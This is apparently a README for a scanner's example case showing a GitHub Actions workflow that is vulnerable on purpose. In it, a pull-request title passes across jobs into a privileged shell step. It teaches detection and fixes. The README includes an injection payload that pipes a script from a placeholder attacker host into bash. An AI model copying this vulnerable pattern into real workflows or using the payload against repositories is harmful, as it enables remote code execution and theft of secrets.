# 04 — Cross-job `needs.<job>.outputs.<name>` (TAINT-GH-009)

A producer job declares an `outputs:` value that traces back to an attacker-controlled context. A consumer job that `needs:` the producer interpolates the value via `${{ needs.<j>.outputs.<n> }}` straight into a shell `run:` block — and the consumer often runs at **higher** privilege precisely because the producer was scoped down.

## The workflow

```yaml
on: pull_request_target

jobs:
  produce:
    runs-on: ubuntu-latest
    outputs:
      title: ${{ github.event.pull_request.title }}
    steps:
      - run: echo "Producer ran"

  consume:
    needs: produce
    runs-on: ubuntu-latest
    permissions:
      contents: write
      packages: write
    steps:
      - run: |
          echo "Building artifact for PR titled: ${{ needs.produce.outputs.title }}"
          echo "build-of-${{ needs.produce.outputs.title }}" > out/marker.txt
```

See [`.github/workflows/vulnerable.yml`](.github/workflows/vulnerable.yml).

## Why it's wrong

This is the cross-job analog of TAINT-GH-004. The producer job `outputs:` block exposes `github.event.pull_request.title`. The consumer job pulls it via `${{ needs.produce.outputs.title }}` directly inside a `run:` line. GitHub Actions interpolates the producer's output into the consumer's run text at workflow-parse time — the attacker's bytes land in the shell command line with the consumer job's full `GITHUB_TOKEN` and bound secrets.

The privilege gradient makes this worse, not better: maintainers often scope down the producer ("just emits metadata") and grant `contents: write` / `packages: write` to the consumer ("the actual build"). The flow chain ignores the gradient — once the title crosses the job boundary, the consumer's tokens are exposed.

A PR titled `widget"; curl http://attacker.example/x | bash; #` produces a consumer step that runs the injected command with `contents: write`.

## Run it

```
taintly examples/04-cross-job-needs
```

Expected headline finding:

```
[CRITICAL] TAINT-GH-009: Attacker-controlled context flows across jobs via needs.<job>.outputs.<name> into a shell run: block
```

## How to fix

1. **Validate at the producer's `outputs:` boundary.** Strip / allow-list the value before it leaves the producer, so every consumer inherits the safe shape:

   ```yaml
   outputs:
     safe_title: ${{ steps.validate.outputs.safe }}
   steps:
     - id: validate
       env:
         RAW: ${{ github.event.pull_request.title }}
       run: |
         SAFE=$(printf "%s" "$RAW" | tr -dc "[:alnum:]_- ")
         echo "safe=$SAFE" >> $GITHUB_OUTPUT
   ```

2. **Consumer never inlines `needs.*.outputs.*` in `run:`.** Bind to a quoted env var, reference the variable:

   ```yaml
   - env:
       RAW_TITLE: "${{ needs.produce.outputs.safe_title }}"
     run: ./tool "$RAW_TITLE"
   ```

3. **Match privilege to source.** If the consumer needs `contents: write`, gate the job with an identity check (PR head repo == base repo) so attacker-fired runs never reach the privileged path.
